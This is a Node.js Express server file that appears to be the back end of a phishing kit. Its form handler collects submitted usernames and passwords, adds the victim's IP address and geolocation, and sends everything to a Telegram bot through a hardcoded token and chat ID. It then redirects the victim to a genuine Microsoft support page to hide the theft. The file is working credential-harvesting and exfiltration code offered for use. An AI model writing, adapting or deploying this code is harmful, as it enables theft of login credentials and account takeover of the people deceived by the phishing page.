// server.js

const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const geoip = require('geoip-lite');

const app = express();
const port = process.env.PORT || 3000; // Use environment variable for port or default to 3000
const TELEGRAM_BOT_TOKEN = '6437372780:AAGdWip_dB-2osbiJZcJeaWFhxMR-nbSw_8'; // Replace with your bot token
const CHAT_ID = '6154689132'; // Replace with your chat ID

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

// Route to handle form submission
app.post('/submit-form', async (req, res) => {
  const formData = req.body;

  // Get IP address from request headers or remote address
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  try {
    // Lookup geo information based on IP
    const geo = geoip.lookup(ip);

    const locationInfo = geo ?
      `City: ${geo.city}, Region: ${geo.region}, Country: ${geo.country}` :
      'Location not found';

    const message = `
    Result Data:
    Username: ${formData.username}
    Password: ${formData.password}
    IP Address: ${ip}
    Location: ${locationInfo}
    `;

    // Send text message to Telegram
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
    });

    // Redirect to Microsoft FAQ page after successful submission
    res.redirect('https://support.microsoft.com/en-us/help/4026268/windows-10-fix-network-connection-issues');
  } catch (error) {
    console.error('Error sending message to Telegram:', error.response ? error.response.data : error.message);
    res.status(500).send('Failed to submit form.');
  }
});

app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
